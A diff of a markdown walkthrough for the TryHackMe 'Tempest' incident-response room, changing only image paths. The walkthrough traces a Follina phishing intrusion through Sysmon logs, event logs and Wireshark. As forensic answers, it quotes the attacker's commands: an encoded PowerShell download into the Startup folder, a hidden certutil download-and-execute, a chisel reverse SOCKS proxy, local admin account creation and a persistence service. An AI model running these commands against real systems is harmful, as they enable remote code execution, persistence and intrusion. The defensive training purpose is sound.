@@ -4,32 +4,32 @@ Hi, this is a writeup for room named Tempest in SOC Level 1 path on tryhackme. I
 In Task 3 we have first three question that needs to be answered. They refer to file hashes that we need to find.
 Open powershell in your deployed machine. Now we need to navigate to *Incident Files* directory. To do this type in the powershell: *cd Desktop/'Incident Files'*. To find hashes we need to type: *Get-FileHash -Algorithm SHA256* and file name.
 
-![](tempest1.png)
+![](images/tempest1.png)
 
 After doing it, answer questions in the task.
 
 Now we need to do one more important thing. I'm talking about parse sysmon.evtx file format into csv. To do so follow instruction in task 3. 
 Now you should see *sysmon.csv* file in the Incident Response folder as shown below:
 
-![](tempest2.png)
+![](images/tempest2.png)
 
 We should also add parsed sysmon.csv file into Timeline Explorer as is shown in the room instruction. After doing it we got clear view of the log file.
 
-![](tempest3.png)
+![](images/tempest3.png)
 
 There is one more important thing to do, we need .xml log file, to open logs in SysmonView. To do so we need to open log file in the Event Viewer by clicking *Open Saved Logs*.
 
-![](tempest4.png)
+![](images/tempest4.png)
 
 Then choose log file *sysmon* in the Incident Response folder and click *open*.
 Now when we have our logs loaded into Event Viewer, we need to extract them in xml format.
 Click *Save All Events As...*
 
-![](tempest5.png)
+![](images/tempest5.png)
 
 Then choose folder and a .xml file extension as shown below.
 
-![](tempest6.png)
+![](images/tempest6.png)
 
 Click *Save* and in the pop-up window about information click ok.
 Then import *sysmon.xml* file into SysmonView as shown in the room task 3 instruction.
@@ -44,11 +44,11 @@ Let's dive into it.
 
 Open Event viewer with our imported earlier sysmon log. From the event description we know that malicious file was downloaded from the Internet. That means we need to filter our log file for *File stream creation* event with id *15*.
 
-![](tempest7.png)
+![](images/tempest7.png)
 
 After doing it, we got just few log entries filtered for us. Begin with the earliest one, we found a file name:
 
-![](tempest8.png)
+![](images/tempest8.png)
 
 **Answer: free_magicules.doc**
 
@@ -56,18 +56,18 @@ After doing it, we got just few log entries filtered for us. Begin with the earl
 *Format: username-machine name***
 To answer this question scroll down the same log entry we found before.
 
-![](tempest9.png)
+![](images/tempest9.png)
 
 **Answer: benimaru-TEMPEST**
 
 **Question 3: What is the PID of the Microsoft Word process that opened the malicious document?**
 We need to filter our log for Process Creation which has EventID 1.
 
-![](tempest10.png)
+![](images/tempest10.png)
 
 Then we use *Find...* for WINWORD.EXE, because malicious file has .doc extension. It indicates that it would be open in a microsoft word.
 
-![](tempest11.png)
+![](images/tempest11.png)
 
 And there it is in the first record found, the answer we need.
 **Answer: 496**
@@ -78,7 +78,7 @@ To answer this question open our pcap file in Incident Files folder.
 In Wireshark use filter *http.request.method\==GET* to filter all web traffic that may be used for file download.
 After doing so there is one record with doc file that catches eye:
 
-![](tempest12.png)
+![](images/tempest12.png)
 
 **Answer: 192.71.199.191**
 
@@ -86,7 +86,7 @@ After doing so there is one record with doc file that catches eye:
 
 This one was a little tricky and after further filtering network traffic in Wireshark i've noticed that it must be traffic from remote server used for code execution. Then i've decided go back to sysmon logs in Event Viewer and i went through it looking specifically for Process Creation record with ID 1. I've found record with an encrypted payload:
 
-![](tempest13.png)
+![](images/tempest13.png)
 
 **Answer: JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg\==**
 
@@ -94,11 +94,11 @@ This one was a little tricky and after further filtering network traffic in Wire
 
 From log found for previous question, i had noticed that process used for command execution is named msdt.exe.
 
-![](tempest14.png)
+![](images/tempest14.png)
 
 After googling it, i found numerous articles about *Follina* vulnerability in Microsoft Windows Diagnostic Tool that allows RCE (Remote Code Execution).
 
-![](tempest15.png)
+![](images/tempest15.png)
 
 **Answer: 2022-30190**
 
@@ -108,7 +108,7 @@ In the guide section we can see few tips. We need to look into autostart executi
 **Question 1: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
 Go back to Event Viewer and filter for File Created with event ID 11. From the base64 encrypted payload, after decoding it in CyberChef, we know that the file download is named *update.zip*. We gonna use this knowledge to look for specific file in the logs with *Find...*. 
 
-![](tempest16.png)
+![](images/tempest16.png)
 
 And there it is, the full path.
 **Answer: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**
@@ -119,14 +119,14 @@ To do this we need to parse our windows.evtx file into csv format and put it int
 We need to run EvtxECmd.exe program once again but this time with windows.evtx file.
 After that put windows.csv into Timeline Explorer and search for specific *4624* id in the Event Id Column. Also in the *Payload Data1* column we should add *Target: TEMPEST\benimaru* to narrow our searches.
 
-![](tempest17.png)
+![](images/tempest17.png)
 
-![](tempest18.png)
+![](images/tempest18.png)
 
 After doing it we know exact time when user benimaru was logging in. With this knowledge we can narrow down our searches in the Event Viewer to find executed payload.
 On 17:15:10 i found suspicious command ran using powershell.
 
-![](tempest19.png)
+![](images/tempest19.png)
 
 **Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split 'http\://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe**
 
@@ -134,11 +134,11 @@ On 17:15:10 i found suspicious command ran using powershell.
 
 In the Timeline Explorer find *Executable Info* column and put there name of the malicious file that was downloaded.
 
-![](tempest20.png)
+![](images/tempest20.png)
 
 Then find *Payload Data3* column and in the second record from below we can find our SHA256 hash.
 
-![](tempest21.png)
+![](images/tempest21.png)
 
 **Answer: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8**
 
@@ -146,7 +146,7 @@ Then find *Payload Data3* column and in the second record from below we can find
 
 Now it's time for Wireshark. Filter the traffic by adding a query: *http.request.method\==GET and ip.dst_host\==167.71.222.162*.
 
-![](tempest22.png)
+![](images/tempest22.png)
 
 And there is the c2 host.
 **Answer: resolvecyber.xyz:80**
@@ -156,14 +156,14 @@ Now we gonna deep dive into pcap traffic file provided in this room.
 **Question 1: What is the URL of the malicious payload embedded in the document?**
 As for now we know that there are two malicious host *phishteam.xyz* and *resolvecyber.xyz*. The second one is used for Command and Control. In Wireshark we run a query: *http.host matches "phishteam.xyz"*. We can see that this is the host from whom malicious files where downloaded. We can also noticed that *index.html* file was accessed by a targeted machine.
 
-![](tempest23.png)
+![](images/tempest23.png)
 
 **Answer: http\://phishteam.xyz/02dcf07/index.html**
 
 **Question 2: What is the encoding used by the attacker on the c2 connection?**
 Now replace domain in our query for *resolvecyber.xyz* we can se bunch of encrypted messages. After grabbing one of them and putting into Cyberchef we know that the attacker used base64 for command encryption.
 
-![](tempest24.png)
+![](images/tempest24.png)
 
 **Answer: base64**
 
@@ -180,7 +180,7 @@ No explanation needed.
 **Question 6: Based on the user agent, what programming language was used by the attacker to compile the binary?**
 Click on the first packet and then Follow TCP Stream. 
 
-![](tempest25.png)
+![](images/tempest25.png)
 
 **Answer: nim**
 
@@ -189,7 +189,7 @@ Task 7
 
 Sticking to Wireshark and filtering traffic from *resolvecyber.xyz* host, i had decoded some payloads and found one where plaintext password was.
 
-![](tempest26.png)
+![](images/tempest26.png)
 
 **Answer: infernotempest**
 
@@ -202,13 +202,13 @@ And after some googling ports, i've found port 5985 is responsible for remote co
 **Question 3: The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**
 During the decoding i found another file that was downloaded. It's ch.exe. Then i've searched for it in Timeline explorer and i've found command used.
 
-![](tempest27.png)
+![](images/tempest27.png)
 
 **Answer: C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks**
 
 **Question 4: What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**
 
-![](tempest28.png)
+![](images/tempest28.png)
 
 **Answer: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451**
 
@@ -226,11 +226,11 @@ Based on the collected findings, the attacker gained a stable shell through a re
 **Question 1: After discovering the privilege of the current user,. the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?**
 Going through logs i had found another file downloaded.
 
-![](tempest29.png)
+![](images/tempest29.png)
 
 Now we need to have in mind that all processes and execution will be through WinRM and that said we should look for wsmprovhost.exe process in log files.
 
-![](tempest30.png)
+![](images/tempest30.png)
 
 **Answer: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D**
 
@@ -244,7 +244,7 @@ After googling printspoofer i found the answer.
 
 **Question 4: Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?**
 
-![](tempest31.png)
+![](images/tempest31.png)
 
 **Answer:final.exe**
 
@@ -252,7 +252,7 @@ After googling printspoofer i found the answer.
 
 We need to go back to Wireshark, add query with a destination IP *ip.dst == 167.71.222.162*, then in the middle tab find *Destination Port* and right click it and apply as a column. Now we see that the second destination port is 8080.
 
-![](tempest32.png)
+![](images/tempest32.png)
 
 **Answer: 8080**
 
@@ -263,13 +263,13 @@ In addition, the unusual executions are related to the malicious C2 binary used 
 **Question 1: Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**
 We need to go back to our sysmon.csv log file and filter for Event ID 1 and further in Executable Info column write "add" which is part of the command for adding users.
 
-![](tempest33.png)
+![](images/tempest33.png)
 
 **Answer: shion,shuna**
 
 **Question 2: Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?**
 
-![](tempest34.png)
+![](images/tempest34.png)
 
 **Answer: /add**
 
@@ -278,7 +278,7 @@ We need to go back to our sysmon.csv log file and filter for Event ID 1 and furt
 
 **Question 4: The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?**
 
-![](tempest35.png)
+![](images/tempest35.png)
 
 **Answer: net localgroup administrators /add shion**
 
@@ -288,7 +288,7 @@ We need to go back to our sysmon.csv log file and filter for Event ID 1 and furt
 **Question 6: After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?**
 When going through the log file i had found sc.exe service being used, i filtered it and there was a command combining it with final.exe binary used before by threat actor.
 
-![](tempest36.png)
+![](images/tempest36.png)
 
 **Answer: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto**
 
